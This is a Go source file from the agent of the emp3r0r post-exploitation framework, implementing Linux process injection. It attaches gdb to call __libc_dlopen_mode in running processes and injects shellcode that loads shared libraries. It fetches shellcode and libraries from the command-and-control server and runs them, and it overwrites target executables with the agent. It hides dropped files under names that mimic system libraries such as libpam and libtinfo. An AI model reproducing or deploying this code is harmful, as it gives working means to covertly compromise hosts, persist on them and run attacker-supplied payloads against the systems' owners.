//go:build linux
// +build linux

package agent

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/file"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	golpe "github.com/jm33-m0/go-lpe"
)

// inject a shared library using dlopen
func gdbInjectSharedLibWorker(path_to_so string, pid int) error {
	gdb_path := RuntimeConfig.UtilsPath + "/gdb"
	if !util.IsExist(gdb_path) {
		res := VaccineHandler()
		if !strings.Contains(res, "success") {
			return fmt.Errorf("Download gdb via VaccineHandler: %s", res)
		}
	}

	temp := "/tmp/emp3r0r"
	if util.IsExist(temp) {
		os.RemoveAll(temp) // ioutil.WriteFile returns "permission denied" when target file exists, can you believe that???
	}
	err := CopySelfTo(temp)
	if err != nil {
		return err
	}
	// cleanup
	defer func() {
		time.Sleep(3 * time.Second)
		err = os.Remove("/tmp/emp3r0r")
		if err != nil {
			log.Printf("Delete /tmp/emp3r0r: %v", err)
		}
	}()

	if pid == 0 {
		cmd := exec.Command("sleep", "10")
		err := cmd.Start()
		if err != nil {
			return err
		}
		pid = cmd.Process.Pid
	}

	gdb_cmd := fmt.Sprintf(`echo 'print __libc_dlopen_mode("%s", 2)' | %s -p %d`,
		path_to_so,
		gdb_path,
		pid)
	out, err := exec.Command("sh", "-c", gdb_cmd).CombinedOutput()
	if err != nil {
		return fmt.Errorf("%s: %s\n%v", gdb_cmd, out, err)
	}

	return nil
}

// Inject loader.so into any process
func GDBInjectLoader(pid int) error {
	so_path, err := prepare_loader_so(pid, "")
	if err != nil {
		return err
	}
	return gdbInjectSharedLibWorker(so_path, pid)
}

// Inject shared lib into any process
func GDBInjectSharedLib(pid int) error {
	so_path, err := prepare_shared_lib()
	if err != nil {
		return err
	}
	return gdbInjectSharedLibWorker(so_path, pid)
}

// copy agent binary and loader.so to persistent location
func prepare_loader_so(pid int, bin string) (so_path string, err error) {
	// only supports x86_64
	if runtime.GOARCH != "amd64" {
		return "", fmt.Errorf("only supports x86_64")
	}

	so_path = fmt.Sprintf("/%s/libtinfo.so.2.1.%d",
		RuntimeConfig.UtilsPath, util.RandInt(0, 30))
	if os.Geteuid() == 0 {
		so_path = fmt.Sprintf("/lib64/libpam.so.1.%d.1", util.RandInt(0, 20))
	}
	if !util.IsExist(so_path) {
		out, err := golpe.ExtractFileFromString(file.LoaderSO_Data)
		if err != nil {
			return "", fmt.Errorf("Extract loader.so failed: %v", err)
		}
		err = os.WriteFile(so_path, out, 0644)
		if err != nil {
			return "", fmt.Errorf("Write loader.so failed: %v", err)
		}
	}

	// see loader/elf/loader.c
	exe_file := util.ProcExePath(pid)
	if pid <= 0 && bin != "" {
		exe_file = bin
	}
	if !util.IsExist(exe_file) {
		return "", fmt.Errorf("target binary %s not found", exe_file)
	}
	agent_path := fmt.Sprintf("%s/_%s",
		util.ProcCwd(pid),
		util.FileBaseName(exe_file))
	if HasRoot() {
		agent_path = fmt.Sprintf("/usr/share/bash-completion/completions/%s",
			util.FileBaseName(exe_file))
	}
	err = CopySelfTo(agent_path)

	return
}

// prepare for guardian_shellcode injection, targeting pid
func prepare_guardian_sc(pid int) (shellcode string, err error) {
	// prepare guardian_shellcode
	proc_exe := util.ProcExePath(pid)
	// backup original binary
	err = CopyProcExeTo(pid, RuntimeConfig.AgentRoot+"/"+util.FileBaseName(proc_exe))
	if err != nil {
		return "", fmt.Errorf("failed to backup %s: %v", proc_exe, err)
	}
	err = CopySelfTo(proc_exe)
	if err != nil {
		return "", fmt.Errorf("failed to overwrite %s with emp3r0r: %v", proc_exe, err)
	}
	sc := gen_guardian_shellcode(proc_exe)

	if len(sc) == 0 {
		return "", fmt.Errorf("failed to generate guardian_shellcode")
	}

	return sc, nil
}

func prepare_shared_lib() (path string, err error) {
	path = fmt.Sprintf("/usr/lib/libBLT.2.5.so.%d.so", util.RandInt(0, 100))
	_, err = DownloadViaCC("to_inject.so", path)
	if err != nil {
		err = fmt.Errorf("Failed to download to_inject.so from CC: %v", err)
	}
	return
}

// prepare the shellcode
func prepare_sc(pid int) (shellcode string, shellcodeLen int) {
	sc, err := DownloadViaCC("shellcode.txt", "")

	if err != nil {
		log.Printf("Failed to download shellcode.txt from CC: %v", err)
		// prepare guardian_shellcode
		emp3r0r_data.GuardianShellcode, err = prepare_guardian_sc(pid)
		if err != nil {
			log.Printf("Failed to prepare_guardian_sc: %v", err)
			return
		}
		sc = []byte(emp3r0r_data.GuardianShellcode)
	}
	shellcode = string(sc)
	log.Printf("Collected shellcode: %s", shellcode)
	shellcodeLen = strings.Count(string(shellcode), "0x")
	if shellcodeLen == 0 {
		log.Printf("Failed to collect shellcode")
		return
	}
	log.Printf("Collected %d bytes of shellcode, preparing to inject", shellcodeLen)
	return
}

// InjectorHandler handles `injector` module
func InjectorHandler(pid int, method string) (err error) {

	// dispatch
	switch method {

	case "shellcode":
		shellcode, _ := prepare_sc(pid)
		if len(shellcode) == 0 {
			return fmt.Errorf("failed to prepare shellcode")
		}
		err = ShellcodeInjector(&shellcode, pid)
		if err != nil {
			return
		}

	case "shared_library":
		so_path, e := prepare_shared_lib()
		if e != nil {
			log.Printf("Injecting loader.so instead")
			err = InjectLoader(pid)
			return err
		}
		err = InjectSharedLib(so_path, pid)

	default:
		err = fmt.Errorf("%s is not supported", method)
	}
	return
}

// inject a shared library into target process
func InjectSharedLib(so_path string, pid int) (err error) {
	dlopen_addr, err := GetSymFromLibc(pid, "__libc_dlopen_mode")
	if err != nil {
		return fmt.Errorf("failed to get __libc_dlopen_mode address for %d: %v", pid, err)
	}
	shellcode := gen_dlopen_shellcode(so_path, dlopen_addr)
	if len(shellcode) == 0 {
		return fmt.Errorf("failed to generate dlopen shellcode")
	}
	return ShellcodeInjector(&shellcode, pid)
}

// InjectLoader inject loader.so into any process, using shellcode
// locate __libc_dlopen_mode in memory then use it to load SO
func InjectLoader(pid int) error {
	so_path, err := prepare_loader_so(pid, "")
	if err != nil {
		return err
	}

	return InjectSharedLib(so_path, pid)
}
